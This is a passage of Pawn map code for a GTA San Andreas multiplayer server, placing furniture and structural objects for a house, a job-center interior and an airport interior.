	mariaintaa = CreateDynamicObjectEx(2007,1472.072,-1750.022,1050.999,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2007,1472.072,-1754.947,1050.999,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1726,1453.215,-1748.390,1051.048,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1726,1460.365,-1748.390,1051.048,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1726,1455.090,-1756.697,1051.048,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1726,1462.282,-1756.697,1051.048,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1502,1456.974,-1757.463,1051.044,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2202,1472.057,-1751.918,1051.048,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(949,1463.848,-1748.628,1051.625,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(949,1463.826,-1756.654,1051.625,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2267,1467.906,-1757.199,1053.415,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2266,1467.714,-1748.262,1052.918,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1569,1456.982,-1714.979,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19325,1463.034,-1749.712,1053.300,90.000,179.994,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19325,1467.176,-1729.947,1053.113,0.000,180.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19325,1467.269,-1723.199,1053.113,0.000,179.994,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(19325,1460.008,-1717.043,1053.113,90.000,179.994,179.994,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2311,1465.573,-1722.432,1051.050,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2311,1460.685,-1717.704,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2293,1466.842,-1717.701,1051.050,0.000,0.000,29.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2813,1466.086,-1722.480,1051.556,0.000,0.000,330.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2827,1466.770,-1722.451,1051.556,0.000,0.000,330.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2852,1460.618,-1717.527,1051.556,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2853,1460.723,-1716.500,1051.556,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2855,1466.816,-1717.683,1051.555,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2854,1466.088,-1716.515,1051.555,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1727,1465.177,-1719.014,1051.050,0.000,0.000,129.998,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1567,1446.500,-1743.693,1051.051,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1567,1446.489,-1727.388,1051.046,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(16780,1451.568,-1742.902,1055.890,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(18608,1463.735,-1726.562,1058.244,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1569,1473.016,-1725.029,1051.050,0.000,0.000,270.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1569,1473.019,-1728.026,1051.050,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1457.107,-1746.679,1056.211,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1449.607,-1750.293,1056.211,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1457.165,-1738.581,1056.211,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1457.065,-1742.619,1056.211,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1457.218,-1760.172,1056.211,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1457.107,-1763.844,1056.211,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1444.788,-1753.227,1056.211,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1449.431,-1755.708,1056.211,0.000,0.000,90.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(2226,1479.764,-1770.183,968.250,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1449.475,-1728.731,1057.848,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1449.460,-1736.032,1057.848,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1449.511,-1724.528,1057.848,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1449.572,-1716.927,1057.848,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(16780,1464.301,-1742.524,1055.890,0.000,0.000,0.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1468.265,-1750.546,1056.211,0.000,0.000,180.000,250.000,250.000);
	mariaintaa = CreateDynamicObjectEx(1893,1468.468,-1754.675,1056.211,0.000,0.000,179.994,250.000,250.000);

	// ---------------------------- CENTRO DE EMPREGO INTERIOR ----------------------------

	CreateDynamicObject(8231,914.6254272,2373.5717773,247.1652374,0.0000000,0.0000000,0.0000000); //object(vgsbikeschl05) (1)
	CreateDynamicObject(1522,915.8932495,2382.2578125,245.3445435,0.0000000,0.0000000,0.0000000); //object(gen_doorshop3) (1)
	CreateDynamicObject(3034,919.7957764,2382.1828613,247.1859436,0.0000000,0.0000000,0.0000000); //object(bd_window) (1)
	CreateDynamicObject(3034,923.2842407,2382.1743164,247.1990967,0.0000000,0.0000000,0.0000000); //object(bd_window) (2)
	CreateDynamicObject(14455,918.0746460,2365.2482910,247.1338806,0.0000000,0.0000000,0.0000000); //object(gs_bookcase) (1)
	CreateDynamicObject(1742,919.9906006,2372.7973633,245.4621124,0.0000000,0.0000000,270.0000000); //object(med_bookshelf) (1)
	CreateDynamicObject(14455,923.3651733,2366.2270508,247.1338806,0.0000000,0.0000000,90.0000000); //object(gs_bookcase) (2)
	CreateDynamicObject(14455,923.3547974,2371.9489746,247.1338806,0.0000000,0.0000000,90.0000000); //object(gs_bookcase) (3)
	CreateDynamicObject(1742,919.9909668,2371.3588867,245.4621124,0.0000000,0.0000000,270.0000000); //object(med_bookshelf) (2)
	CreateDynamicObject(1742,919.7505493,2372.3378906,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (3)
	CreateDynamicObject(1742,919.7505493,2370.8981934,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (4)
	CreateDynamicObject(16780,919.8518066,2373.0869141,249.0150146,0.0000000,0.0000000,0.0000000); //object(ufo_light03) (1)
	CreateDynamicObject(1742,916.8347168,2366.1904297,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (5)
	CreateDynamicObject(1742,916.8429565,2367.6733398,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (6)
	CreateDynamicObject(1742,916.8413086,2369.1511230,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (7)
	CreateDynamicObject(1742,919.9890137,2374.2373047,245.4621124,0.0000000,0.0000000,270.0000000); //object(med_bookshelf) (8)
	CreateDynamicObject(1742,919.7505493,2373.7780762,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (9)
	CreateDynamicObject(1742,919.9882202,2375.6826172,245.4621124,0.0000000,0.0000000,270.0000000); //object(med_bookshelf) (10)
	CreateDynamicObject(1742,919.7505493,2375.2270508,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (11)
	CreateDynamicObject(2161,915.1920776,2365.1301270,245.4621124,0.0000000,0.0000000,180.0000000); //object(med_office_unit_4) (1)
	CreateDynamicObject(2163,920.4407959,2382.0202637,245.4621124,0.0000000,0.0000000,0.0000000); //object(med_office_unit_2) (1)
	CreateDynamicObject(2164,912.3986206,2368.3293457,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_office_unit_5) (1)
	CreateDynamicObject(2191,923.0307617,2379.2011719,245.4621124,0.0000000,0.0000000,270.0000000); //object(med_office2_cab) (1)
	CreateDynamicObject(2197,914.7448120,2372.3581543,245.4621124,0.0000000,0.0000000,0.0000000); //object(filling_cabinet) (1)
	CreateDynamicObject(2200,912.3241577,2365.9323730,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_office5_unit_1) (1)
	CreateDynamicObject(2208,918.8720093,2367.7370605,245.4621124,0.0000000,0.0000000,0.0000000); //object(med_office7_unit_1) (1)
	CreateDynamicObject(1998,915.2447510,2369.6242676,245.4621124,0.0000000,0.0000000,270.0000000); //object(officedesk1l) (1)
	CreateDynamicObject(2008,916.2277222,2367.6547852,245.4621124,0.0000000,0.0000000,270.0000000); //object(officedesk1) (1)
	CreateDynamicObject(2165,912.9027100,2370.1862793,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_office_desk_1) (1)
	CreateDynamicObject(2166,912.8970337,2372.1564941,245.4621124,0.0000000,0.0000000,0.0000000); //object(med_office_desk_2) (1)
	CreateDynamicObject(2172,915.6588745,2376.1813965,245.4695129,0.0000000,0.0000000,90.0000000); //object(med_office2_desk_1) (1)
	CreateDynamicObject(2183,918.0533447,2378.3457031,245.4621124,0.0000000,0.0000000,0.0000000); //object(med_office3_desk_09) (1)
	CreateDynamicObject(2193,916.6556396,2374.1777344,245.4621124,0.0000000,0.0000000,90.0000000); //object(med_office2_desk_2) (1)
	CreateDynamicObject(2198,923.0257568,2381.2822266,245.4621124,0.0000000,0.0000000,270.0000000); //object(med_office2_desk_3) (1)
	CreateDynamicObject(2163,918.5972900,2382.0229492,245.4621124,0.0000000,0.0000000,0.0000000); //object(med_office_unit_2) (2)
	CreateDynamicObject(2172,915.6566772,2378.2119141,245.4695129,0.0000000,0.0000000,90.0000000); //object(med_office2_desk_1) (2)
	CreateDynamicObject(1806,920.3786621,2378.0141602,245.4621124,0.0000000,0.0000000,7.9399719); //object(med_office_chair) (1)
	CreateDynamicObject(1806,918.5792236,2377.8767090,245.4621124,0.0000000,0.0000000,348.0877686); //object(med_office_chair) (2)
	CreateDynamicObject(1806,918.6915283,2380.0561523,245.4621124,0.0000000,0.0000000,182.6105652); //object(med_office_chair) (3)
	CreateDynamicObject(1806,920.5337524,2380.0119629,245.4621124,0.0000000,0.0000000,168.7143555); //object(med_office_chair) (4)
	CreateDynamicObject(1806,913.3820801,2370.7456055,245.4621124,0.0000000,0.0000000,85.7149658); //object(med_office_chair) (5)
	CreateDynamicObject(1806,915.7495728,2366.9382324,245.4621124,0.0000000,0.0000000,265.1700134); //object(med_office_chair) (6)
	CreateDynamicObject(1806,915.3819580,2368.4631348,245.4621124,0.0000000,0.0000000,344.8807983); //object(med_office_chair) (7)
	CreateDynamicObject(2813,921.4256592,2367.8129883,246.3274078,0.0000000,0.0000000,0.0000000); //object(gb_novels01) (1)
	CreateDynamicObject(2813,918.9002686,2367.7734375,246.3274078,0.0000000,0.0000000,290.2102051); //object(gb_novels01) (2)
	CreateDynamicObject(2813,918.9884644,2379.4064941,246.2726593,0.0000000,0.0000000,230.5239258); //object(gb_novels01) (3)
	CreateDynamicObject(2815,914.3474121,2366.7944336,245.4621124,0.0000000,0.0000000,90.0000000); //object(gb_livingrug01) (1)
	CreateDynamicObject(2815,914.3897705,2370.8613281,245.4621124,0.0000000,0.0000000,90.0000000); //object(gb_livingrug01) (2)
	CreateDynamicObject(2853,920.8146362,2367.7294922,246.3274078,0.0000000,0.0000000,19.8498535); //object(gb_bedmags03) (1)
	CreateDynamicObject(2853,921.0860596,2378.6071777,246.2733917,0.0000000,0.0000000,209.2768555); //object(gb_bedmags03) (2)
	CreateDynamicObject(2854,920.0894165,2367.7617188,246.3274078,0.0000000,0.0000000,300.1801758); //object(gb_bedmags04) (1)
	CreateDynamicObject(2854,918.9763794,2378.5561523,246.2733917,0.0000000,0.0000000,340.0594482); //object(gb_bedmags04) (2)
	CreateDynamicObject(2870,914.6318359,2373.2519531,247.1420288,0.0000000,0.0000000,49.8500061); //object(gb_ornament05) (1)
	CreateDynamicObject(2852,919.5176392,2367.7597656,246.3274078,0.0000000,0.0000000,0.0000000); //object(gb_bedmags02) (1)
	CreateDynamicObject(2824,923.2169800,2378.9736328,247.2830200,0.0000000,0.0000000,89.7300110); //object(gb_novels02) (1)
	CreateDynamicObject(14705,915.4743652,2365.3005371,247.0689697,0.0000000,0.0000000,141.7407227); //object(int2vase) (1)
	CreateDynamicObject(1806,916.0184937,2376.8168945,245.4621124,0.0000000,0.0000000,95.6267090); //object(med_office_chair) (8)
	CreateDynamicObject(1806,916.0617676,2378.8098145,245.4695129,0.0000000,0.0000000,75.6849976); //object(med_office_chair) (9)
	CreateDynamicObject(1806,916.7422485,2374.8298340,245.4621124,0.0000000,0.0000000,75.6848145); //object(med_office_chair) (10)
	CreateDynamicObject(949,923.1823120,2377.6049805,246.0983887,0.0000000,0.0000000,39.8800049); //object(plant_pot_4) (1)
	CreateDynamicObject(949,915.6163330,2380.1542969,246.0983887,0.0000000,0.0000000,69.7848816); //object(plant_pot_4) (2)
	CreateDynamicObject(2001,916.3126221,2365.5214844,245.4621124,0.0000000,0.0000000,0.0000000); //object(nu_plant_ofc) (1)
	CreateDynamicObject(2001,919.9333496,2370.0949707,245.4621124,0.0000000,0.0000000,47.8650208); //object(nu_plant_ofc) (2)
	CreateDynamicObject(2196,918.4666138,2378.7441406,246.2733917,0.0000000,0.0000000,320.1201477); //object(work_lamp1) (1)
	CreateDynamicObject(2196,920.6401978,2378.2321777,246.2733917,0.0000000,0.0000000,230.3897552); //object(work_lamp1) (2)
	CreateDynamicObject(2196,918.0093384,2379.7187500,246.2733917,0.0000000,0.0000000,50.9287415); //object(work_lamp1) (3)
	CreateDynamicObject(2196,920.5585938,2379.1069336,246.2733917,0.0000000,0.0000000,140.6571655); //object(work_lamp1) (4)
	CreateDynamicObject(2894,920.2086182,2378.4204102,246.2733917,0.0000000,0.0000000,7.9399719); //object(kmb_rhymesbook) (1)
	CreateDynamicObject(2894,920.2412720,2379.4514160,246.2733917,0.0000000,0.0000000,348.0427246); //object(kmb_rhymesbook) (2)
	CreateDynamicObject(2833,922.1947021,2374.1113281,245.4621124,0.0000000,0.0000000,90.0000000); //object(gb_livingrug02) (1)
	CreateDynamicObject(2833,922.1977539,2372.1459961,245.4621124,0.0000000,0.0000000,90.0000000); //object(gb_livingrug02) (2)
	CreateDynamicObject(2833,922.1959839,2370.1848145,245.4621124,0.0000000,0.0000000,90.0000000); //object(gb_livingrug02) (3)
	CreateDynamicObject(1722,915.4871826,2373.5632324,245.4621124,0.0000000,0.0000000,180.0000000); //object(off_chairnu) (1)
	CreateDynamicObject(1722,916.1394043,2373.5656738,245.4621124,0.0000000,0.0000000,179.9945068); //object(off_chairnu) (2)
	CreateDynamicObject(1722,916.7902832,2373.5754395,245.4621124,0.0000000,0.0000000,179.9945068); //object(off_chairnu) (3)
	
	// ------------ INTERIOR AEROPORTO ---------------
	
	CreateDynamicObject(1566, -1869.59998, 42.40000, 1055.50000,   0.00000, 0.00000, 269.99997);
	CreateDynamicObject(8547, -1875.00000, -15.19922, 1054.19995,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2938, -1883.69995, 49.40000, 1056.80005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2938, -1875.69995, 49.40000, 1059.40002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2938, -1880.09998, 49.40000, 1052.80005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2938, -1888.80005, 50.20000, 1056.80005,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2938, -1888.79980, 62.00000, 1059.40002,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2938, -1888.80005, 68.80000, 1056.80005,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2938, -1882.80005, 72.10000, 1056.80005,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2938, -1871.80005, 72.10000, 1056.80005,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2938, -1860.40002, 72.20000, 1056.69995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2938, -1848.69995, 72.10000, 1056.19995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2938, -1838.30005, 72.10000, 1056.80005,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2938, -1835.09998, 68.80000, 1056.80005,   0.00000, 0.01199, 179.95850);
	CreateDynamicObject(2938, -1835.09998, 59.60000, 1059.40002,   0.00000, 0.01099, 179.95605);
	CreateDynamicObject(2938, -1835.09961, 50.19922, 1056.80005,   0.00000, 0.00549, 180.09886);
	CreateDynamicObject(2938, -1831.50000, 49.50000, 1056.80005,   0.00000, 0.00549, 271.16278);
	CreateDynamicObject(2938, -1840.59998, 49.40000, 1059.30005,   0.00000, 0.00000, 270.22296);
	CreateDynamicObject(2938, -1847.40002, 49.40000, 1056.69995,   0.00000, 0.00000, 270.21973);
	CreateDynamicObject(2938, -1848.00000, 49.39941, 1056.69995,   0.00000, 0.00000, 270.21973);
	CreateDynamicObject(2938, -1853.90002, 43.50000, 1056.69995,   0.00000, 0.00000, 0.51175);
	CreateDynamicObject(1566, -1863.69995, 72.00000, 1055.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1566, -1860.59998, 72.00000, 1055.59998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1492, -1874.09998, 49.50000, 1054.19995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2938, -1869.69995, 43.50000, 1052.80005,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2938, -1869.69995, 43.50000, 1059.40002,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2938, -1869.69995, 38.90000, 1056.80005,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2938, -1874.09961, 39.89941, 1055.59998,   0.00000, 0.00000, 1.12610);
	CreateDynamicObject(2938, -1880.09998, 45.90000, 1056.80005,   0.00000, 0.00000, 88.89392);
	CreateDynamicObject(2938, -1878.19995, 43.30000, 1056.80005,   0.00000, 0.00000, 0.38620);
	CreateDynamicObject(1649, -1835.19995, 61.60000, 1055.69995,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1649, -1835.19922, 61.69922, 1055.30005,   0.00000, 0.00000, 88.59924);
	CreateDynamicObject(1569, -1835.09961, 56.39941, 1054.09998,   0.00000, 0.00000, 219.99573);
	CreateDynamicObject(1569, -1835.09961, 59.19922, 1054.09998,   0.00000, 0.00000, 149.57465);
	CreateDynamicObject(11474, -1876.39941, 49.29980, 1056.09998,   0.00000, 0.00000, 6.60828);
	CreateDynamicObject(970, -1867.30005, 47.50000, 1054.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -1863.19995, 47.50000, 1054.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -1859.69995, 47.50000, 1054.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -1863.90002, 45.10000, 1054.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -1859.80005, 45.10000, 1054.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -1855.69995, 45.10000, 1054.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1861.80005, 55.50000, 1055.30005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1861.80005, 55.50000, 1057.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1861.80005, 66.00000, 1055.30005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1861.79980, 66.00000, 1057.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1873.50000, 55.50000, 1055.30005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1873.50000, 55.50000, 1057.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1873.50000, 66.00000, 1055.30005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1873.50000, 66.00000, 1057.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1849.79980, 66.00000, 1055.30005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1849.80005, 66.00000, 1057.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1849.80005, 55.50000, 1055.30005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1839.39941, 49.09961, 1055.30005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1839.40002, 49.00000, 1057.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, -1849.80005, 55.50000, 1057.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, -1834.50000, 65.69922, 1054.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2938, -1859.89941, 40.09961, 1056.80005,   0.00000, 0.00000, 90.72510);
	CreateDynamicObject(2938, -1868.59961, 40.00000, 1056.80005,   0.00000, 0.00000, 90.58228);
	CreateDynamicObject(2395, -1854.50000, 40.30000, 1054.09998,   0.00000, 0.00000, 181.13611);
	CreateDynamicObject(2395, -1858.19995, 40.30000, 1054.09998,   0.00000, 0.00000, 180.41168);
	CreateDynamicObject(2395, -1861.90002, 40.20000, 1054.09998,   0.00000, 0.00000, 180.40649);
	CreateDynamicObject(2395, -1865.59998, 40.20000, 1054.09998,   0.00000, 0.00000, 180.40649);
	CreateDynamicObject(2395, -1869.19922, 40.19922, 1054.09998,   0.00000, 0.00000, 177.23694);
	CreateDynamicObject(2395, -1854.50000, 40.29980, 1056.80005,   0.00000, 0.00000, 179.57153);
	CreateDynamicObject(2395, -1858.09998, 40.30000, 1056.80005,   0.00000, 0.00000, 180.47180);
	CreateDynamicObject(2395, -1861.80005, 40.20000, 1056.80005,   0.00000, 0.00000, 180.46692);
	CreateDynamicObject(2395, -1865.50000, 40.20000, 1056.80005,   0.00000, 0.00000, 180.26669);
	CreateDynamicObject(2395, -1869.19995, 40.20000, 1056.80005,   0.00000, 0.00000, 180.26367);
	CreateDynamicObject(2395, -1830.80005, 65.70000, 1054.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, -1827.09998, 65.70000, 1054.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, -1829.59998, 65.70000, 1056.80005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, -1834.59998, 65.70000, 1056.80005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, -1831.09998, 65.70000, 1056.80005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, -1826.59998, 65.30000, 1054.09998,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1826.59998, 65.30000, 1056.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1826.59961, 61.59961, 1054.09998,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1826.59961, 61.59961, 1056.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1826.59998, 58.40000, 1056.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1826.59961, 55.29980, 1056.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1826.59998, 57.90000, 1054.09998,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1826.59998, 54.60000, 1054.09998,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1827.00000, 53.90000, 1054.09998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2395, -1827.00000, 53.90000, 1056.80005,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1831.80005, 53.90000, 1054.09998,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1831.80005, 53.90000, 1056.80005,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1829.19995, 53.90000, 1056.80005,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1829.50000, 53.90000, 1054.09998,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1834.90002, 53.10000, 1054.09998,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1834.90002, 54.10000, 1056.69995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1834.90002, 63.20000, 1054.09998,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1834.90002, 63.20000, 1056.69995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1834.90002, 59.60000, 1056.69995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1834.90002, 57.00000, 1056.69995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2412, -1834.40002, 59.10000, 1054.09998,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2412, -1834.30005, 55.90000, 1054.09998,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2541, -1826.89941, 59.00000, 1054.30005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2541, -1826.79980, 57.50000, 1054.30005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2582, -1834.69995, 54.90000, 1055.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(12854, -1830.89941, 59.79980, 1056.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2941, -1834.19995, 63.40000, 1055.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2941, -1832.19995, 63.40000, 1055.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1713, -1877.80005, 46.80000, 1054.09998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2938, -1875.90002, 42.60000, 1056.80005,   0.00000, 0.00000, 90.94608);
	CreateDynamicObject(2009, -1870.30005, 44.20000, 1054.09998,   0.00000, 0.00000, 179.33179);
	CreateDynamicObject(2009, -1872.59998, 43.30000, 1054.09998,   0.00000, 0.00000, 90.01389);
	CreateDynamicObject(1671, -1871.19995, 43.90000, 1054.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1671, -1872.90002, 44.20000, 1054.59998,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2231, -1878.19995, 49.20000, 1056.40002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2231, -1878.19995, 46.40000, 1056.40002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3803, -1865.59998, 49.00000, 1054.40002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(995, -1853.30005, 62.10000, 1054.40002,   0.00000, 0.00000, 181.99953);
	CreateDynamicObject(995, -1880.09998, 61.50000, 1054.69995,   0.00000, 0.00000, 103.09116);
	CreateDynamicObject(995, -1876.50000, 65.50000, 1054.69995,   0.00000, 0.00000, 266.34314);
	CreateDynamicObject(995, -1881.00000, 68.60000, 1054.69995,   0.00000, 0.00000, 89.97046);
	CreateDynamicObject(995, -1881.00000, 64.90000, 1054.69995,   0.00000, 0.00000, 89.96704);
	CreateDynamicObject(995, -1880.90002, 62.20000, 1054.69995,   0.00000, 0.00000, 89.96704);
	CreateDynamicObject(995, -1876.50000, 69.80000, 1054.69995,   0.00000, 0.00000, 269.96704);
	CreateDynamicObject(995, -1876.59998, 65.90000, 1054.69995,   0.00000, 0.00000, 269.96155);
	CreateDynamicObject(995, -1871.69995, 70.40000, 1054.69995,   0.00000, 0.00000, 180.34155);
	CreateDynamicObject(995, -1870.40002, 66.30000, 1054.69995,   0.00000, 0.00000, 90.01648);
	CreateDynamicObject(995, -1870.50000, 62.50000, 1054.69995,   0.00000, 0.00000, 90.01648);
	CreateDynamicObject(995, -1866.50000, 61.90000, 1054.69995,   0.00000, 0.00000, 180.01648);
	CreateDynamicObject(995, -1866.09998, 65.70000, 1054.69995,   0.00000, 0.00000, 269.80045);
	CreateDynamicObject(995, -1866.00000, 69.30000, 1054.69995,   0.00000, 0.00000, 269.79675);
	CreateDynamicObject(995, -1866.00000, 73.10000, 1054.69995,   0.00000, 0.00000, 269.79675);
	CreateDynamicObject(995, -1857.40002, 67.60000, 1054.69995,   0.00000, 0.00000, 89.79675);
	CreateDynamicObject(995, -1857.40002, 63.50000, 1054.69995,   0.00000, 0.00000, 89.79126);
	CreateDynamicObject(995, -1857.30005, 62.20000, 1054.69995,   0.00000, 0.00000, 89.79126);
	CreateDynamicObject(995, -1853.40002, 61.90000, 1054.69995,   0.00000, 0.00000, 179.79126);
	CreateDynamicObject(995, -1853.00000, 65.80000, 1054.69995,   0.00000, 0.00000, 269.78577);
	CreateDynamicObject(995, -1852.90002, 68.30000, 1054.69995,   0.00000, 0.00000, 269.99951);
	CreateDynamicObject(995, -1852.90002, 71.80000, 1054.69995,   0.00000, 0.00000, 269.99451);
